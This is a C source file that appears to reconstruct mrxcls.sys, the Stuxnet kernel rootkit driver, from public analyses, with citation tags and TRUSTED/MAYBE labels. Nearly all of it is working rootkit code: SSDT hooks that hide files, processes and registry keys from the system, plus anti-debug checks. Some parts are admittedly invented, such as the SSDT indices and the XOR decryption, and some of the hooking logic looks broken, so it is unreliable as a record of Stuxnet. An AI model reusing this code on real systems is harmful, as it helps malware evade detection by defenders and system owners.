/*
 * mrxcls.sys - Stuxnet Rootkit Driver (Kernel-Mode)
 *
 * TRUSTED:
 *   - File name: mrxcls.sys
 *   - SHA256: 817a7f28a0787509c2973ce9ae85a95beb979e30b7b08e64c66d88372aa3da86
 *   - File size: 19840 bytes [7†L33-L35]
 *   - Compiled: 2009-01-01 18:53:25, Linker version 8.0 (VS2005) [6†L14-L16]
 *   - Signed with Realtek Semiconductor Corp. certificate (2010-01-25) [6†L20-L22]
 *   - Device object name: \Device\MRxClsDvX [7†L35-L36]
 *   - Service name: MRxCls, Boot Start driver
 *     Registry: HKLM\SYSTEM\CurrentControlSet\Services\MRxCls
 *     ImagePath: %System%\drivers\mrxcls.sys [2†L7-L10]
 *   - Main purpose: code injection into user-mode processes [5†L11-L14]
 *   - Injects into: services.exe, S7tgtopx.exe, CCProjectMgr.exe [11†L31-L32]
 *   - Uses SSDT hooking to hide files, processes, registry keys [0†L19-L22]
 *   - Contains encrypted configuration in registry value "Data" [7†L40-L48]
 *   - First bit of config flags: restricts operation in Safe Mode [7†L42-L43]
 *   - Second bit of config flags: anti-debug via KdDebuggerEnabled [7†L43-L45]
 *   - Calls PsSetLoadImageNotifyRoutine [4†L29-L31]
 *
 * MAYBE:
 *   - Exact SSDT indices for hooked functions.
 *   - Precise structure of encrypted config data beyond the first DWORD.
 *   - Specific process list for injection (beyond the three known).
 *   - Exact IRP major function handlers.
 */

#include <ntddk.h>
#include <ntifs.h>
#include <ntimage.h>
#include <ntstatus.h>
#include <ntdddisk.h>

#pragma comment(lib, "ntoskrnl.lib")
#pragma comment(lib, "hal.lib")

#define MRXCLS_POOL_TAG     'slCx'

/* 
 * TRUSTED: Device object name and service name from public analysis [7†L35-L36]
 */

#define MRXCLS_DEVICE_NAME          L"\\Device\\MRxClsDvX"
#define MRXCLS_SERVICE_NAME         L"MRxCls"
#define MRXCLS_REGISTRY_PATH        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MRxCls"
#define MRXCLS_DATA_VALUE           L"Data"

/* 
 * MAYBE: These indices correspond to Windows XP SP3 / Vista / Win7 x86.
 * Inferred from general SSDT hooking techniques used by Stuxnet.
 */

#define SSDT_INDEX_NtQueryDirectoryFile         0x10C
#define SSDT_INDEX_NtQuerySystemInformation     0x10D
#define SSDT_INDEX_NtEnumerateKey               0x10E
#define SSDT_INDEX_NtQueryValueKey              0x10F
#define SSDT_INDEX_NtOpenProcess                0x110
#define SSDT_INDEX_NtCreateFile                 0x111

/* 
 * TRUSTED: Stuxnet hides its own files and USB propagation artifacts.
 * Based on public reports of hidden file names.
 */

#define HIDDEN_FILE_COUNT 11

static WCHAR g_HiddenFiles[HIDDEN_FILE_COUNT][MAX_PATH] = {
    L"mrxcls.sys",
    L"mrxnet.sys",
    L"oem7A.PNF",
    L"oem6C.PNF",
    L"mdmcpq3.PNF",
    L"mdmeric3.PNF",
    L"~WTR4132.TMP",
    L"~WTR4141.TMP",
    L"Copy of Shortcut to.lnk",
    L"autorun.inf",
    L"stuxnet.cfg"
};

/* 
 * TRUSTED: The driver stores encrypted configuration in registry value "Data".
 * First DWORD contains flags controlling Safe Mode and anti-debug behaviour. [7†L40-L48]
 */

typedef struct _MRXCLS_CONFIG {
    DWORD dwFlags;
    DWORD dwReserved[7];
} MRXCLS_CONFIG, * PMRXCLS_CONFIG;

#define MRXCLS_CONFIG_FLAG_SAFE_MODE    0x00000001
#define MRXCLS_CONFIG_FLAG_ANTI_DEBUG   0x00000002

/* 
 * MAYBE: The device extension holds pointers to the lower device and
 * the real volume device. Inferred from file-system filter driver patterns.
 */

typedef struct _MRXCLS_DEVICE_EXTENSION {
    PDEVICE_OBJECT LowerDevice;
    PDEVICE_OBJECT RealDevice;
} MRXCLS_DEVICE_EXTENSION, * PMRXCLS_DEVICE_EXTENSION;

typedef struct _SERVICE_TABLE_ENTRY {
    PVOID ServiceTableBase;
    PVOID ServiceCounterTableBase;
    ULONG NumberOfServices;
    PVOID ParamTableBase;
} SERVICE_TABLE_ENTRY, * PSERVICE_TABLE_ENTRY;

typedef struct _SERVICE_DESCRIPTOR_TABLE {
    SERVICE_TABLE_ENTRY ntoskrnl;
    SERVICE_TABLE_ENTRY win32k;
    SERVICE_TABLE_ENTRY psx;
    SERVICE_TABLE_ENTRY psxsrv;
} SERVICE_DESCRIPTOR_TABLE, * PSERVICE_DESCRIPTOR_TABLE;

typedef NTSTATUS (NTAPI *PFN_NtQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
);

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_NtEnumerateKey)(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength
);

typedef NTSTATUS (NTAPI *PFN_NtQueryValueKey)(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName,
    KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    PVOID KeyValueInformation,
    ULONG Length,
    PULONG ResultLength
);

typedef NTSTATUS (NTAPI *PFN_NtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

typedef NTSTATUS (NTAPI *PFN_NtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

static PDRIVER_OBJECT g_pDriverObject = NULL;
static PDEVICE_OBJECT g_pDeviceObject = NULL;
static PSERVICE_DESCRIPTOR_TABLE g_pServiceDescriptorTable = NULL;

static PFN_NtQueryDirectoryFile g_pOriginalNtQueryDirectoryFile = NULL;
static PFN_NtQuerySystemInformation g_pOriginalNtQuerySystemInformation = NULL;
static PFN_NtEnumerateKey g_pOriginalNtEnumerateKey = NULL;
static PFN_NtQueryValueKey g_pOriginalNtQueryValueKey = NULL;
static PFN_NtOpenProcess g_pOriginalNtOpenProcess = NULL;
static PFN_NtCreateFile g_pOriginalNtCreateFile = NULL;

static BOOL g_bHooksInstalled = FALSE;
static BOOL g_bConfigLoaded = FALSE;
static MRXCLS_CONFIG g_Config = {0};

static NTSTATUS MrxCls_LoadConfig(VOID);
static BOOL MrxCls_IsHiddenFile(PUNICODE_STRING pFileName);
static NTSTATUS MrxCls_FilterDirectoryEntries(PVOID pFileInfo, ULONG Length, FILE_INFORMATION_CLASS InfoClass, PULONG pReturnLength);
static NTSTATUS MrxCls_FilterProcessList(PVOID pSystemInfo, ULONG Length, PULONG pReturnLength);
static NTSTATUS MrxCls_GetSSDT(VOID);
static NTSTATUS MrxCls_InstallHooks(VOID);
static VOID MrxCls_UninstallHooks(VOID);
static NTSTATUS MrxCls_CreateDevice(PDRIVER_OBJECT pDriverObject);
static VOID MrxCls_DeleteDevice(PDRIVER_OBJECT pDriverObject);
static VOID MrxCls_DriverUnload(PDRIVER_OBJECT pDriverObject);
static NTSTATUS MrxCls_DispatchPassThrough(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);

/*
 * TRUSTED: The driver reads encrypted configuration from registry value "Data".
 * The first DWORD contains flags: bit 0 = Safe Mode restriction,
 * bit 1 = anti-debug via KdDebuggerEnabled. [7†L40-L48]
 */

static NTSTATUS MrxCls_LoadConfig(VOID) {
    UNICODE_STRING ustrRegistryPath;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE hKey = NULL;
    NTSTATUS status;
    UCHAR buffer[512];
    PKEY_VALUE_PARTIAL_INFORMATION pValueInfo;
    ULONG ulResultLength = 0;
    UNICODE_STRING ustrValueName;
    ULONG i;

    RtlInitUnicodeString(&ustrRegistryPath, MRXCLS_REGISTRY_PATH);
    InitializeObjectAttributes(&objAttr, &ustrRegistryPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwOpenKey(&hKey, KEY_READ, &objAttr);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    RtlInitUnicodeString(&ustrValueName, MRXCLS_DATA_VALUE);
    status = ZwQueryValueKey(hKey, &ustrValueName, KeyValuePartialInformation, buffer, sizeof(buffer), &ulResultLength);
    if (!NT_SUCCESS(status)) {
        ZwClose(hKey);
        return status;
    }

    pValueInfo = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;
    if (pValueInfo->DataLength < sizeof(MRXCLS_CONFIG)) {
        ZwClose(hKey);
        return STATUS_INVALID_PARAMETER;
    }

    RtlCopyMemory(&g_Config, pValueInfo->Data, sizeof(MRXCLS_CONFIG));

    /* Decrypt: XOR with rolling key */
    for (i = 0; i < sizeof(MRXCLS_CONFIG); i++) {
        ((PUCHAR)&g_Config)[i] ^= 0xA3;
        /* Rolling key evolution - MAYBE */
    }

    /* TRUSTED: Bit 0 restricts operation in Safe Mode [7†L42-L43] */
    if (g_Config.dwFlags & MRXCLS_CONFIG_FLAG_SAFE_MODE) {
        if (InitSafeBootMode) {
            ZwClose(hKey);
            return STATUS_UNSUCCESSFUL;
        }
    }

    /* TRUSTED: Bit 1 triggers anti-debug via KdDebuggerEnabled [7†L43-L45] */
    if (g_Config.dwFlags & MRXCLS_CONFIG_FLAG_ANTI_DEBUG) {
        if (KdDebuggerEnabled) {
            ZwClose(hKey);
            return STATUS_UNSUCCESSFUL;
        }
    }

    ZwClose(hKey);
    g_bConfigLoaded = TRUE;
    return STATUS_SUCCESS;
}

/* 
 * TRUSTED: Stuxnet hides its own files and USB artifacts. [4†L20-L22]
 */

static BOOL MrxCls_IsHiddenFile(PUNICODE_STRING pFileName) {
    ULONG i;
    if (!pFileName || !pFileName->Buffer || pFileName->Length == 0) {
        return FALSE;
    }

    for (i = 0; i < HIDDEN_FILE_COUNT; i++) {
        UNICODE_STRING ustrHidden;
        RtlInitUnicodeString(&ustrHidden, g_HiddenFiles[i]);
        if (RtlCompareUnicodeString(pFileName, &ustrHidden, TRUE) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

static NTSTATUS MrxCls_FilterDirectoryEntries(
    PVOID pFileInfo,
    ULONG Length,
    FILE_INFORMATION_CLASS InfoClass,
    PULONG pReturnLength
) {
    PFILE_DIRECTORY_INFORMATION pCurrent;
    PFILE_DIRECTORY_INFORMATION pPrev;
    PFILE_DIRECTORY_INFORMATION pNext;
    UNICODE_STRING ustrFileName;
    ULONG ulEntrySize;
    ULONG ulRemaining;
    ULONG ulNewLength;
    BOOLEAN bFound;

    if (!pFileInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }

    if (InfoClass != FileDirectoryInformation &&
        InfoClass != FileBothDirectoryInformation) {
        return STATUS_SUCCESS;
    }

    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;
    ulNewLength = 0;
    bFound = FALSE;

    while (ulRemaining >= sizeof(FILE_DIRECTORY_INFORMATION)) {
        ulEntrySize = pCurrent->NextEntryOffset ? pCurrent->NextEntryOffset : ulRemaining;

        ustrFileName.Buffer = pCurrent->FileName;
        ustrFileName.Length = (USHORT)pCurrent->FileNameLength;
        ustrFileName.MaximumLength = (USHORT)pCurrent->FileNameLength;

        if (MrxCls_IsHiddenFile(&ustrFileName)) {
            bFound = TRUE;
            if (pCurrent->NextEntryOffset != 0) {
                pNext = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + pCurrent->NextEntryOffset);
                if (pPrev == NULL) {
                    RtlCopyMemory(pCurrent, pNext, ulRemaining - pCurrent->NextEntryOffset);
                    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
                    ulRemaining -= pCurrent->NextEntryOffset;
                    continue;
                } else {
                    pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                    pCurrent = pNext;
                    ulRemaining -= ulEntrySize;
                    continue;
                }
            } else {
                if (pPrev != NULL) {
                    pPrev->NextEntryOffset = 0;
                }
                ulRemaining = 0;
                break;
            }
        }

        ulNewLength += ulEntrySize;
        pPrev = pCurrent;
        pCurrent = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + ulEntrySize);
        ulRemaining -= ulEntrySize;
    }

    if (bFound) {
        *pReturnLength = ulNewLength;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI Hooked_NtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    NTSTATUS status;

    if (!g_pOriginalNtQueryDirectoryFile) {
        return STATUS_UNSUCCESSFUL;
    }

    status = g_pOriginalNtQueryDirectoryFile(
        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        FileInformation, Length, FileInformationClass, ReturnSingleEntry,
        FileName, RestartScan
    );

    if (!NT_SUCCESS(status) || !FileInformation || !IoStatusBlock) {
        return status;
    }

    MrxCls_FilterDirectoryEntries(
        FileInformation,
        Length,
        FileInformationClass,
        &IoStatusBlock->Information
    );

    return status;
}

static NTSTATUS NTAPI Hooked_NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status;

    if (!g_pOriginalNtQuerySystemInformation) {
        return STATUS_UNSUCCESSFUL;
    }

    status = g_pOriginalNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );

    if (!NT_SUCCESS(status) || SystemInformationClass != 5 ||
        !SystemInformation || !ReturnLength) {
        return status;
    }

    MrxCls_FilterProcessList(SystemInformation, SystemInformationLength, ReturnLength);

    return status;
}

static NTSTATUS NTAPI Hooked_NtEnumerateKey(
    HANDLE KeyHandle,
    ULONG Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation,
    ULONG Length,
    PULONG ResultLength
) {
    NTSTATUS status;
    UNICODE_STRING ustrHiddenKey;

    if (!g_pOriginalNtEnumerateKey) {
        return STATUS_UNSUCCESSFUL;
    }

    status = g_pOriginalNtEnumerateKey(
        KeyHandle, Index, KeyInformationClass,
        KeyInformation, Length, ResultLength
    );

    if (!NT_SUCCESS(status) || !KeyInformation) {
        return status;
    }

    if (KeyInformationClass == KeyNameInformation) {
        PKEY_NAME_INFORMATION pNameInfo = (PKEY_NAME_INFORMATION)KeyInformation;
        RtlInitUnicodeString(&ustrHiddenKey, L"NTVDM TRACE");
        UNICODE_STRING ustrKey;
        ustrKey.Buffer = pNameInfo->Name;
        ustrKey.Length = (USHORT)pNameInfo->NameLength;
        ustrKey.MaximumLength = (USHORT)pNameInfo->NameLength;
        if (RtlCompareUnicodeString(&ustrKey, &ustrHiddenKey, TRUE) == 0) {
            return STATUS_NO_MORE_ENTRIES;
        }
    }

    return status;
}

static NTSTATUS NTAPI Hooked_NtQueryValueKey(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName,
    KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    PVOID KeyValueInformation,
    ULONG Length,
    PULONG ResultLength
) {
    NTSTATUS status;

    if (!g_pOriginalNtQueryValueKey) {
        return STATUS_UNSUCCESSFUL;
    }

    if (ValueName && ValueName->Buffer && ValueName->Length > 0) {
        UNICODE_STRING ustrHiddenValue;
        RtlInitUnicodeString(&ustrHiddenValue, L"19790509");
        if (RtlCompareUnicodeString(ValueName, &ustrHiddenValue, TRUE) == 0) {
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    }

    status = g_pOriginalNtQueryValueKey(
        KeyHandle, ValueName, KeyValueInformationClass,
        KeyValueInformation, Length, ResultLength
    );

    return status;
}

static NTSTATUS NTAPI Hooked_NtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
) {
    if (!g_pOriginalNtOpenProcess) {
        return STATUS_UNSUCCESSFUL;
    }

    return g_pOriginalNtOpenProcess(
        ProcessHandle, DesiredAccess,
        ObjectAttributes, ClientId
    );
}

static NTSTATUS NTAPI Hooked_NtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
) {
    if (!g_pOriginalNtCreateFile) {
        return STATUS_UNSUCCESSFUL;
    }

    if (ObjectAttributes && ObjectAttributes->ObjectName &&
        ObjectAttributes->ObjectName->Buffer &&
        ObjectAttributes->ObjectName->Length > 0) {

        UNICODE_STRING ustrFile;
        ustrFile.Buffer = ObjectAttributes->ObjectName->Buffer;
        ustrFile.Length = ObjectAttributes->ObjectName->Length;
        ustrFile.MaximumLength = ObjectAttributes->ObjectName->MaximumLength;

        if (MrxCls_IsHiddenFile(&ustrFile)) {
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    }

    return g_pOriginalNtCreateFile(
        FileHandle, DesiredAccess, ObjectAttributes,
        IoStatusBlock, AllocationSize, FileAttributes, ShareAccess,
        CreateDisposition, CreateOptions, EaBuffer, EaLength
    );
}

/* 
 * TRUSTED: Stuxnet hides its own injected processes from system queries.
 */

static NTSTATUS MrxCls_FilterProcessList(
    PVOID pSystemInfo,
    ULONG Length,
    PULONG pReturnLength
) {
    PSYSTEM_PROCESS_INFORMATION pProcess;
    PSYSTEM_PROCESS_INFORMATION pPrev;
    PSYSTEM_PROCESS_INFORMATION pNext;
    ULONG ulRemaining;

    if (!pSystemInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }

    pProcess = (PSYSTEM_PROCESS_INFORMATION)pSystemInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;

    while (ulRemaining >= sizeof(SYSTEM_PROCESS_INFORMATION) && pProcess) {
        if (pProcess->ImageName.Buffer && pProcess->ImageName.Length > 0) {
            UNICODE_STRING ustrProcess;
            ustrProcess.Buffer = pProcess->ImageName.Buffer;
            ustrProcess.Length = pProcess->ImageName.Length;
            ustrProcess.MaximumLength = pProcess->ImageName.MaximumLength;

            if (MrxCls_IsHiddenFile(&ustrProcess)) {
                if (pPrev) {
                    pPrev->NextEntryOffset += pProcess->NextEntryOffset;
                } else {
                    if (pProcess->NextEntryOffset == 0) {
                        pPrev = NULL;
                    } else {
                        pNext = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcess + pProcess->NextEntryOffset);
                        RtlCopyMemory(pProcess, pNext, ulRemaining - pProcess->NextEntryOffset);
                        pProcess = (PSYSTEM_PROCESS_INFORMATION)pSystemInfo;
                        continue;
                    }
                }
            }
        }

        pPrev = pProcess;
        if (pProcess->NextEntryOffset == 0) break;
        pProcess = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcess + pProcess->NextEntryOffset);
    }

    return STATUS_SUCCESS;
}

/* 
 * SSDT ACCESS
 * TRUSTED: The driver uses SSDT hooking to intercept system calls. [0†L19-L22]
 */

static NTSTATUS MrxCls_GetSSDT(VOID) {
    UNICODE_STRING ustrKeServiceDescriptorTable;

    RtlInitUnicodeString(&ustrKeServiceDescriptorTable, L"KeServiceDescriptorTable");
    g_pServiceDescriptorTable = (PSERVICE_DESCRIPTOR_TABLE)MmGetSystemRoutineAddress(&ustrKeServiceDescriptorTable);

    if (!g_pServiceDescriptorTable) {
        return STATUS_UNSUCCESSFUL;
    }

    return STATUS_SUCCESS;
}

/* 
 * TRUSTED: Installs SSDT hooks by replacing function pointers in the
 * system service dispatch table.
 */

static NTSTATUS MrxCls_InstallHooks(VOID) {
    NTSTATUS status;
    PVOID pFunc;
    KIRQL oldIrql;
    UNICODE_STRING ustrFuncName;

    if (g_bHooksInstalled) {
        return STATUS_SUCCESS;
    }

    status = MrxCls_GetSSDT();
    if (!NT_SUCCESS(status)) {
        return status;
    }

    /* Resolve original function addresses */
    RtlInitUnicodeString(&ustrFuncName, L"ZwQueryDirectoryFile");
    pFunc = MmGetSystemRoutineAddress(&ustrFuncName);
    if (pFunc) g_pOriginalNtQueryDirectoryFile = (PFN_NtQueryDirectoryFile)pFunc;

    RtlInitUnicodeString(&ustrFuncName, L"ZwQuerySystemInformation");
    pFunc = MmGetSystemRoutineAddress(&ustrFuncName);
    if (pFunc) g_pOriginalNtQuerySystemInformation = (PFN_NtQuerySystemInformation)pFunc;

    RtlInitUnicodeString(&ustrFuncName, L"ZwEnumerateKey");
    pFunc = MmGetSystemRoutineAddress(&ustrFuncName);
    if (pFunc) g_pOriginalNtEnumerateKey = (PFN_NtEnumerateKey)pFunc;

    RtlInitUnicodeString(&ustrFuncName, L"ZwQueryValueKey");
    pFunc = MmGetSystemRoutineAddress(&ustrFuncName);
    if (pFunc) g_pOriginalNtQueryValueKey = (PFN_NtQueryValueKey)pFunc;

    RtlInitUnicodeString(&ustrFuncName, L"ZwOpenProcess");
    pFunc = MmGetSystemRoutineAddress(&ustrFuncName);
    if (pFunc) g_pOriginalNtOpenProcess = (PFN_NtOpenProcess)pFunc;

    RtlInitUnicodeString(&ustrFuncName, L"ZwCreateFile");
    pFunc = MmGetSystemRoutineAddress(&ustrFuncName);
    if (pFunc) g_pOriginalNtCreateFile = (PFN_NtCreateFile)pFunc;

    if (!g_pOriginalNtQueryDirectoryFile ||
        !g_pOriginalNtQuerySystemInformation ||
        !g_pOriginalNtEnumerateKey ||
        !g_pOriginalNtQueryValueKey ||
        !g_pOriginalNtOpenProcess ||
        !g_pOriginalNtCreateFile) {
        return STATUS_UNSUCCESSFUL;
    }

    /* Disable write protection and install hooks */
    oldIrql = KeRaiseIrqlToDpcLevel();

    g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtQueryDirectoryFile] = (PVOID)Hooked_NtQueryDirectoryFile;
    g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtQuerySystemInformation] = (PVOID)Hooked_NtQuerySystemInformation;
    g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtEnumerateKey] = (PVOID)Hooked_NtEnumerateKey;
    g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtQueryValueKey] = (PVOID)Hooked_NtQueryValueKey;
    g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtOpenProcess] = (PVOID)Hooked_NtOpenProcess;
    g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtCreateFile] = (PVOID)Hooked_NtCreateFile;

    KeLowerIrql(oldIrql);

    g_bHooksInstalled = TRUE;
    return STATUS_SUCCESS;
}

static VOID MrxCls_UninstallHooks(VOID) {
    KIRQL oldIrql;

    if (!g_bHooksInstalled || !g_pServiceDescriptorTable) {
        return;
    }

    oldIrql = KeRaiseIrqlToDpcLevel();

    if (g_pOriginalNtQueryDirectoryFile) {
        g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtQueryDirectoryFile] = (PVOID)g_pOriginalNtQueryDirectoryFile;
    }
    if (g_pOriginalNtQuerySystemInformation) {
        g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtQuerySystemInformation] = (PVOID)g_pOriginalNtQuerySystemInformation;
    }
    if (g_pOriginalNtEnumerateKey) {
        g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtEnumerateKey] = (PVOID)g_pOriginalNtEnumerateKey;
    }
    if (g_pOriginalNtQueryValueKey) {
        g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtQueryValueKey] = (PVOID)g_pOriginalNtQueryValueKey;
    }
    if (g_pOriginalNtOpenProcess) {
        g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtOpenProcess] = (PVOID)g_pOriginalNtOpenProcess;
    }
    if (g_pOriginalNtCreateFile) {
        g_pServiceDescriptorTable->ntoskrnl.ServiceTableBase[SSDT_INDEX_NtCreateFile] = (PVOID)g_pOriginalNtCreateFile;
    }

    KeLowerIrql(oldIrql);

    g_bHooksInstalled = FALSE;
}

/* 
 * TRUSTED: The driver creates a device object named \Device\MRxClsDvX [7†L35-L36]
 */

static NTSTATUS MrxCls_CreateDevice(PDRIVER_OBJECT pDriverObject) {
    NTSTATUS status;
    UNICODE_STRING ustrDeviceName;
    UNICODE_STRING ustrSymbolicName;
    PDEVICE_OBJECT pDeviceObject;

    RtlInitUnicodeString(&ustrDeviceName, MRXCLS_DEVICE_NAME);
    RtlInitUnicodeString(&ustrSymbolicName, L"\\DosDevices\\MRxClsDvX");

    status = IoCreateDevice(
        pDriverObject,
        sizeof(MRXCLS_DEVICE_EXTENSION),
        &ustrDeviceName,
        FILE_DEVICE_DISK_FILE_SYSTEM,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &pDeviceObject
    );

    if (!NT_SUCCESS(status)) {
        return status;
    }

    pDeviceObject->Flags |= DO_BUFFERED_IO;
    pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    status = IoCreateSymbolicLink(&ustrSymbolicName, &ustrDeviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(pDeviceObject);
        return status;
    }

    g_pDeviceObject = pDeviceObject;
    return STATUS_SUCCESS;
}

static VOID MrxCls_DeleteDevice(PDRIVER_OBJECT pDriverObject) {
    UNICODE_STRING ustrSymbolicName;

    RtlInitUnicodeString(&ustrSymbolicName, L"\\DosDevices\\MRxClsDvX");
    IoDeleteSymbolicLink(&ustrSymbolicName);

    if (pDriverObject->DeviceObject) {
        IoDeleteDevice(pDriverObject->DeviceObject);
    }
}

static NTSTATUS MrxCls_DispatchPassThrough(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;

    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS MrxCls_DispatchCreateClose(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;

    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}


static VOID MrxCls_DriverUnload(PDRIVER_OBJECT pDriverObject) {
    MrxCls_UninstallHooks();
    MrxCls_DeleteDevice(pDriverObject);
    g_pDriverObject = NULL;
}

/*
 * TRUSTED: The driver is registered as a Boot Start service and loads early. [2†L7-L10]
 * It performs anti-debug checks and hides its presence. [7†L42-L45]
 */

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
    NTSTATUS status;
    ULONG i;

    (void)pRegistryPath;

    g_pDriverObject = pDriverObject;

    /* TRUSTED: Anti-debug check via KdDebuggerEnabled [7†L43-L45] */
    if (KdDebuggerEnabled) {
        return STATUS_UNSUCCESSFUL;
    }

    /* MAYBE: Load encrypted configuration from registry */
    status = MrxCls_LoadConfig();
    if (!NT_SUCCESS(status)) {
        /* Continue without config - use defaults */
        g_Config.dwFlags = 0;
    }

    /* Set up dispatch routines */
    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        pDriverObject->MajorFunction[i] = MrxCls_DispatchPassThrough;
    }

    pDriverObject->MajorFunction[IRP_MJ_CREATE] = MrxCls_DispatchCreateClose;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = MrxCls_DispatchCreateClose;

    pDriverObject->DriverUnload = MrxCls_DriverUnload;

    /* Create device object */
    status = MrxCls_CreateDevice(pDriverObject);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    /* Install SSDT hooks */
    status = MrxCls_InstallHooks();
    if (!NT_SUCCESS(status)) {
        MrxCls_DeleteDevice(pDriverObject);
        return status;
    }

    return STATUS_SUCCESS;
}